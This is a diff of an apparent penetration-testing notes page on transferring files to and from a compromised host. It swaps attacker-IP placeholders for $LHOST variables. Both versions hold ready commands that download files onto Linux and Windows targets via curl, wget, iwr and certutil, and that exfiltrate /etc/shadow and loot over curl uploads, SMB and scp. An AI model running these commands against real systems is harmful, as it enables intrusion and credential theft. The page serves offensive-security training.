@@ -12,9 +12,9 @@ Before committing to a transfer method, confirm what's allowed outbound from the
 
 ```bash
 # From target - can it reach you?
-curl http://<attacker-ip>/test
-ping -c 1 <attacker-ip>
-nslookup <attacker-ip>
+curl http://$LHOST/test
+ping -c 1 $LHOST
+nslookup $LHOST
 ```
 
 If nothing works, check if a proxy or internal host has outbound access and pivot through it.
@@ -48,21 +48,21 @@ impacket-smbserver PWN /home/user/loot -smb2support
 **Linux target:**
 
 ```bash
-wget http://<attacker-ip>/file -O /tmp/file
-curl http://<attacker-ip>/file -o /tmp/file
+wget http://$LHOST/file -O /tmp/file
+curl http://$LHOST/file -o /tmp/file
 ```
 
 **Windows target:**
 
 ```powershell
-iwr -uri http://<attacker-ip>/file -OutFile C:\Temp\file
-certutil -urlcache -split -f http://<attacker-ip>/file C:\Temp\file
+iwr -uri http://$LHOST/file -OutFile C:\Temp\file
+certutil -urlcache -split -f http://$LHOST/file C:\Temp\file
 ```
 
 **Via SMB:**
 
 ```powershell
-copy \\<attacker-ip>\PWN\file C:\Temp\file
+copy \\$LHOST\PWN\file C:\Temp\file
 ```
 
 See [File Transfer Techniques](file-transfer-techniques.md) for a full reference including base64 encoding and netcat transfers.
@@ -74,19 +74,19 @@ See [File Transfer Techniques](file-transfer-techniques.md) for a full reference
 **Push files to attacker machine via curl:**
 
 ```bash
-curl -F "file=@/etc/shadow" http://<attacker-ip>/upload
+curl -F "file=@/etc/shadow" http://$LHOST/upload
 ```
 
 **Via SMB (Windows → attacker):**
 
 ```powershell
-copy C:\Temp\loot.txt \\<attacker-ip>\PWN\loot.txt
+copy C:\Temp\loot.txt \\$LHOST\PWN\loot.txt
 ```
 
 **Via SCP (if SSH is available):**
 
 ```bash
-scp root@10.10.10.10:/etc/shadow /tmp/shadow
+scp root@$IP:/etc/shadow /tmp/shadow
 ```
 
 See [Secure Transfers](secure-transfers.md) for encrypted channels and covert exfiltration techniques.
